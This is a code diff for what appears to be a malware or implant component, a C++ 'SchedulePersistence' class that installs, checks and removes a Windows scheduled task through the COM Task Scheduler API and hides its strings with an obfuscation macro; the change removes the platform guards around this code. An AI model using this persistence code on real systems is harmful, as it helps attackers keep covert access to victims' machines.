@@ -5,14 +5,11 @@
 #include "security/Obfuscation.h"
 #include <string>
 #include <vector>
-
-#if PLATFORM_WINDOWS
 #include <windows.h>
 #include <taskschd.h>
 #include <comdef.h>
 #pragma comment(lib, "taskschd.lib")
 #pragma comment(lib, "comsuppw.lib")
-#endif
 
 // Obfuscated strings
 const auto OBF_SCHEDULE_PERSISTENCE = OBFUSCATE("SchedulePersistence");
@@ -23,9 +20,7 @@ SchedulePersistence::SchedulePersistence(Configuration* config)
     : BasePersistence(config) {}
 
 SchedulePersistence::~SchedulePersistence() {
-#if PLATFORM_WINDOWS
     CoUninitialize();
-#endif
 }
 
 bool SchedulePersistence::Install() {
@@ -33,7 +28,6 @@ bool SchedulePersistence::Install() {
         return true;
     }
 
-#if PLATFORM_WINDOWS
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     if (FAILED(hr)) {
         LOG_ERROR("COM initialization failed: " + std::to_string(hr));
@@ -77,12 +71,8 @@ bool SchedulePersistence::Install() {
     }
 
     return success;
-#else
-    return false;
-#endif
 }
 
-#if PLATFORM_WINDOWS
 bool SchedulePersistence::CreateScheduledTask(ITaskService* pService) {
     ITaskFolder* pRootFolder = NULL;
     HRESULT hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
@@ -184,10 +174,8 @@ bool SchedulePersistence::CreateScheduledTask(ITaskService* pService) {
     pRegisteredTask->Release();
     return true;
 }
-#endif
 
 bool SchedulePersistence::Remove() {
-#if PLATFORM_WINDOWS
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     if (FAILED(hr)) {
         LOG_ERROR("COM initialization failed: " + std::to_string(hr));
@@ -234,13 +222,9 @@ bool SchedulePersistence::Remove() {
 
     LOG_ERROR("Failed to remove scheduled task: " + std::to_string(hr));
     return false;
-#else
-    return false;
-#endif
 }
 
 bool SchedulePersistence::IsInstalled() const {
-#if PLATFORM_WINDOWS
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     if (FAILED(hr)) {
         return false;
@@ -282,7 +266,4 @@ bool SchedulePersistence::IsInstalled() const {
     }
 
     return false;
-#else
-    return false;
-#endif
 }
